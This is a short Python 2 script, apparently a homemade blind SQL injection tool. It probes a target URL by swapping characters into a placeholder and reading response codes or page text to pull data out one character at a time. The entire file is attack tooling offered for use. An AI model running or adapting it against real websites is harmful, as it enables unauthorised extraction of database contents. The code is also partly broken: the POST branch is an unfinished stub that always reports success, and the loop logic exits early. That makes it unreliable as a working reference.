import urllib,urllib2,sys,getopt
#blindSqli Tool build by Airbasic
global urlParam,dataParam,typeParam,passParam
urlParam = ""
dataParam = ""
typeParam = ""
passParam = ""
charList = "abcdefghijklmnopqrstuvwxyz0123456789-_.@"
def getParam():
	global urlParam,dataParam,typeParam,passParam
	opts,args = getopt.getopt(sys.argv[1:],"hu:d:t:p:")
	for op,value in opts:
		if op == "-h":
			showUsage()
		elif op == "-u":
			urlParam = value
		elif op == "-d":
			dataParam = value
		elif op == "-t":
			typeParam = value
		elif op == "-p":
			passParam = value
	if urlParam == "" or typeParam =="" or passParam == "":
		showUsage()

def showUsage():
	print 'BlindSqli Tester Usage'
	print sys.argv[0]+' -u URL -d {POST} -t httpCode/sourceCode -p PASSSYMBOL'
	sys.exit()

def blindSqli():
	global urlParam,dataParam,typeParam,passParam
	print 'DATA:',
	noResult = 'false'
	while 1:
		for aChar in charList:
			if dataParam != "":
				callback = postInj(urlParam,aChar)
			else:
				callback = getInj(urlParam,aChar)
			if callback == "pass":
				print aChar,
				#change the payload , add achar to it
				changePayload(aChar)
				continue
			#if no pass use symbol to show error
			noResult = 'true'
		if noResult == 'true':
			noResult = 'false'
			print '\nIt seems over but no more char detected , thx for using'
			sys.exit()
		

def postInj(PurlParam,PaChar):
	global urlParam,dataParam,typeParam,passParam
	#havn't edit yet
	return 'pass'

def getInj(PurlParam,PaChar):
	global urlParam,dataParam,typeParam,passParam
	testUrl = urlParam.replace('*',PaChar)

	if typeParam == "httpCode":
		httpCode = urllib.urlopen(testUrl).getcode()
		if str(passParam) in str(httpCode):
			return 'pass'
		else:
			return 'false'
			

	if typeParam == "sourceCode":
		try:
			sourceCode = urllib.urlopen(testUrl).read()
			if str(passParam) in str(sourceCode):
				return 'pass'
			else:
				return 'false'
		except:
			print '\nERROR '
			return 'false'

def changePayload(PaChar):
	global urlParam,dataParam,typeParam,passParam
	urlParam = urlParam.replace('*',PaChar+'*')


getParam()
blindSqli()
